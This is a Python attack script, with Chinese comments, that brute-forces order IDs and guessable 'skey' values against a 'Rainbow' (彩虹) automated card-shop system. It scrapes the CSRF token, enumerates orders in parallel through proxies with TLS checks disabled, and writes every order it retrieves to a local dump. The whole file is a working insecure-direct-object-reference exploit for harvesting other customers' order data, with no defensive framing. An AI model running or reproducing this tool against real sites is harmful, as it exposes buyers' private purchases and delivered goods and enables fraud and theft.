#!/usr/bin/env python3
"""彩虹并行 order+skey 探测（yanzu_idor_worker 模式）。"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import requests

from faka_common import DEFAULT_UA, log, resolve_proxy


def skey_candidates(oid: int) -> list[str]:
    s = str(oid)
    return ["", s, hashlib.md5(s.encode()).hexdigest(), hashlib.md5(f"{s}{s}".encode()).hexdigest()]


def get_csrf(base: str, proxy: str) -> str:
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    r = s.get(base, timeout=20, headers={"User-Agent": DEFAULT_UA})
    m = re.search(r'csrf_token\s*=\s*"([^"]+)"', r.text)
    return m.group(1) if m else ""


def probe_one(base: str, oid: int, csrf: str, proxy: str) -> dict | None:
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({"User-Agent": DEFAULT_UA, "Referer": base + "?mod=query", "X-Requested-With": "XMLHttpRequest"})
    for sk in skey_candidates(oid):
        try:
            r = s.post(base + "ajax.php?act=order", data={"id": str(oid), "skey": sk, "csrf_token": csrf}, timeout=12)
            j = r.json()
            if j.get("code") == 0:
                return {"id": oid, "skey": sk, "response": j}
        except Exception:
            pass
    return None


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="彩虹并行 order+skey worker")
    ap.add_argument("host")
    ap.add_argument("path", nargs="?", default="/")
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--end", type=int, default=0)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--out", default="/data/tools/faka/out/yanzu_dump")
    ap.add_argument("--proxy", default="auto")
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    proxy = resolve_proxy(args.proxy)
    base = f"https://{args.host}{args.path if args.path.endswith('/') else args.path + '/'}"
    out_root = Path(args.out)
    out_root.mkdir(parents=True, exist_ok=True)

    csrf = get_csrf(base, proxy)
    start = args.start or 1
    end = args.end or (start + 200)

    hits: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(probe_one, base, oid, csrf, proxy): oid for oid in range(end, start - 1, -1)}
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                hits.append(res)
                (out_root / f"order_{res['id']}.json").write_text(
                    json.dumps(res["response"], ensure_ascii=False, indent=2), encoding="utf-8"
                )
                log(f"HIT {res['id']} skey={res['skey']!r}")

    report = {"time": datetime.now().isoformat(), "range": [start, end], "hits": hits}
    (out_root / "idor_worker_hits.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"完成 hits={len(hits)}")
    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
